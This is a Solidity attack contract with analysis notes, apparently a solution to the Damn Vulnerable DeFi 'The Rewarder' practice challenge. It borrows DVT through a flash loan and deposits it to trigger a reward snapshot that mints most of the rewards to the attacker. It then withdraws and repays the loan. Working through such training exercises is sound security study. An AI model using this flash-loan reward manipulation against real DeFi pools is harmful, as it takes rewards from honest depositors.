// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { FlashLoanerPool } from "./FlashLoanerPool.sol";
import { TheRewarderPool } from "./TheRewarderPool.sol";
import { DamnValuableToken } from "../DamnValuableToken.sol";
import { RewardToken } from "./RewardToken.sol";

contract AttackRewarder {
    FlashLoanerPool loanerPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken damnToken;
    RewardToken rewardToken;
    address owner;

    constructor(
        address _loanerPool, 
        address _rewarderPool, 
        address _damnToken, 
        address _rewardToken
        )
    {
        loanerPool = FlashLoanerPool(_loanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        damnToken = DamnValuableToken(_damnToken);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    // IDEA 
        // we need to clean out the rewardsToken totalSupply somehow...

    function setUp(uint256 _amount) public {
        damnToken.increaseAllowance(address(rewarderPool), _amount);
    }

    function executeAttack(uint256 _amount) public {
        loanerPool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external {
        
        rewarderPool.deposit(_amount);
        rewardToken.transfer(address(tx.origin), rewardToken.balanceOf(address(this)));
        rewarderPool.withdraw(_amount);
        

        // pay back the flashLoan
        damnToken.transfer(address(loanerPool), _amount);
    }
}

/**

Prompt
    - There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
    - Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
    - You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
    - By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?

Goal
    - What are we suppose to accomplish?
    "...you must claim most rewards for yourself."
    - Four users deposit coins and each accumuates 25 reward tokens
    "The amount of rewards earned should be really close to 100 tokens"
    
    - We need to claim all rewardTokens somehow...
    - We should also finish with 0 DVT

IDEA RewarderPool
    this pool interacts with three different tokens, each has it's purpose which is explicit from the
    variable names. The accounting token is used to track liquidity token while the rewards token only
    tracks the rewards earned by a wallet

    rewardToken - mints tokens for leaving liquidityToken in pool for five days
        there is no burn function available here, interesting...
    liquidityToken - token used to provide liquidity to pool
    accountingToken - mints and burns tokens based on the size of liquidityToken you have provided to pool

    deposit(uint256 amountToDeposit)
        - require amountToDeposit gt 0
        - accountingToken.mint(msg.sender, amountToDeposit)
        - distributeRewards()
            - define uint256 rewards = 0
            - isNewRewardsRound returns =>
                block.timestamp gte lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
            - isNewRewardsRound() eq true
                - _recordSnapshot()
                    - set lastSnapshotIdForRewards = accountingToken.snapshot()
                        - require(msg.sender has SNAPSHOT_ROLE)
                        - return _snapshot()
                            - increment _currentSnapshotId
                            - set currentId to _getCurrentSnapshotId()
                            - emit Snapshot(currentId) event to broadcast new snapshot id
                            - return currentId
                    - set lastRecordedSnapshotTimestamp = block.timestamp
                    - increment roundNumber
            - define uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards)
            - define uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards)
            - if amountDeposited gt 0 AND totalDeposits gt 0
                - rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits
                - if rewards gt 0 AND opposite(_hasRetrievedReward = false)
                    - rewardToken.mint(msg.sender, rewards)
                    - lastRewardTimestamps[msg.sender] = block.timestamp
            - return rewards
        - require success call (liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit))

    withdraw(uint256 amountToWithdraw)
        - accountingToken.burn(msg.sender, amountToWithdraw)
        - require

IDEA FlashLoanerPool
    This contract gives away free flashLoans of dvts

    flashLoan(uint256 amount) {nonReentrant guard}
        - define uint256 balanceBefore = liquidityToken.balanceOf(address(this)) { this = pool }
        - require amount lte balanceBefore
        - require msg.sender.isContract() { openzeppelin Address library }
        - liquidityToken.transfer(msg.sender, amount)
        - msg.sender.functionCall(receiveFlashLoan(uint256), amount) { we can gain control here }
            - Do our black magic here
        - require liquidityToken.balanceOf(address(this)) gte balanceBefore { this = pool }

IDEA INIT THOUGHTS
    - use the flashloan to deposit tokens to mint rewards, then we withdraw and return the funds immediately






*/